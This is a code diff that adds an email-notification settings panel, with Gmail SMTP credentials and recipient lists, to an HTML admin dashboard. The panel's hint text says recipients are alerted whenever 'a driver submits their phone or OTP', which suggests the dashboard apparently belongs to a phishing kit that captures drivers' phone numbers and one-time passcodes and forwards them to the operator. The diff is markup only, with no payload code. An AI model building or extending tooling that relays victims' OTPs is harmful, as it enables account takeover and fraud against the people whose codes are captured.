@@ -138,6 +138,66 @@
                 </div>
             </div>
 
+            <!-- Email Notification Settings Panel -->
+            <section class="email-settings-section">
+                <div class="section-header">
+                    <h3><i class="fa-solid fa-envelope"></i> Email Notification Settings</h3>
+                    <button class="btn-icon-admin" onclick="toggleEmailPanel()" id="email-panel-toggle" style="background:#334155; padding: 6px 14px; font-size: 12px;">
+                        <i class="fa-solid fa-chevron-down" id="email-panel-icon"></i> Show Settings
+                    </button>
+                </div>
+                <div id="email-settings-panel" class="email-panel hidden" style="display: none;">
+                    
+                    <!-- SMTP Configuration -->
+                    <div class="email-config-group">
+                        <h4><i class="fa-solid fa-server"></i> SMTP Configuration (Gmail)</h4>
+                        <div class="email-form-grid">
+                            <div class="email-input-group">
+                                <label>SMTP Host</label>
+                                <input type="text" id="smtp-host" placeholder="smtp.gmail.com" value="smtp.gmail.com">
+                            </div>
+                            <div class="email-input-group">
+                                <label>Port</label>
+                                <input type="number" id="smtp-port" placeholder="587" value="587">
+                            </div>
+                            <div class="email-input-group">
+                                <label>Gmail Address (Sender)</label>
+                                <input type="email" id="smtp-user" placeholder="your-email@gmail.com">
+                            </div>
+                            <div class="email-input-group">
+                                <label>App Password</label>
+                                <input type="password" id="smtp-pass" placeholder="Gmail App Password">
+                            </div>
+                        </div>
+                        <button class="btn-save-smtp" onclick="saveSMTPConfig()">
+                            <i class="fa-solid fa-floppy-disk"></i> Save SMTP Config
+                        </button>
+                        <span id="smtp-status-msg" class="config-status"></span>
+                    </div>
+
+                    <!-- Notification Recipients -->
+                    <div class="email-config-group">
+                        <h4><i class="fa-solid fa-users"></i> Notification Recipients</h4>
+                        <p class="config-hint">Add one or more Gmail addresses to receive notifications when a driver submits their phone or OTP.</p>
+                        <div class="recipients-list" id="recipients-list">
+                            <!-- Dynamic email inputs will be added here -->
+                        </div>
+                        <div class="recipients-actions">
+                            <button class="btn-add-email" onclick="addEmailRecipient()">
+                                <i class="fa-solid fa-plus"></i> Add Email
+                            </button>
+                            <button class="btn-save-smtp" onclick="saveRecipientEmails()">
+                                <i class="fa-solid fa-floppy-disk"></i> Save Recipients
+                            </button>
+                            <button class="btn-icon-admin" onclick="sendTestEmail()" style="background:#3B82F6; padding: 8px 16px;">
+                                <i class="fa-solid fa-paper-plane"></i> Send Test Email
+                            </button>
+                        </div>
+                        <span id="recipients-status-msg" class="config-status"></span>
+                    </div>
+                </div>
+            </section>
+
             <!-- Live Activity Notification Bar & Stream -->
             <section class="live-activity-section">
                 <div class="section-header">
